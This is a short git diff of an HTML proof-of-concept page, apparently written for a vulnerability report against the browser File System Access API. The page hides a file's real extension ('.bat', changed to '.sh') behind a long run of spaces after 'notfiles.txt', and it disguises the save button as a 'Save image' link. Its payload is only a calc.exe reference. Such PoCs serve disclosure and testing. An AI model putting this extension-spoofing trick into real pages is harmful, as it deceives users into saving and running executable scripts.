@@ -3,27 +3,27 @@
 
 <head>
     <meta charset="utf-8">
-    <title>File System Access API - Hide extension by many white spaces</title>
+    <title>My POC ATTACKER</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="icon" type="image/x-icon" href="favicon.png">
 </head>
 
 <body>
-    <h3>File System Access API - Hide extension by many white spaces</h3>
     <div style="display: flex; flex-direction: column">
         <div>
-            <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save image</button>
-        </div>
+          <a id="addNewFile" href="https://www.google.com/" style="font-size: 26px; margin-top: 10px; display: inline-block;">
+            Save image Downloads
+        </a>        </div>
 
     </div>
     <script>
         const butSaveNewFile = document.getElementById('addNewFile')
         butSaveNewFile.addEventListener('click', async () => {
             const options = {
-                    suggestedName: 'notmalicious.txt                                                                                                                                       .bat',
+                    suggestedName: 'notfiles.txt                                                             .sh                                                                          ',
                     types: [{
                         description: 'Text file',
-                        accept: { 'text/plain': ['.bat'] },
+                        accept: { 'text/plain': ['.sh'] },
                         content: 'C:\\Windows\\system32\\calc.exe'
                     }],
             };
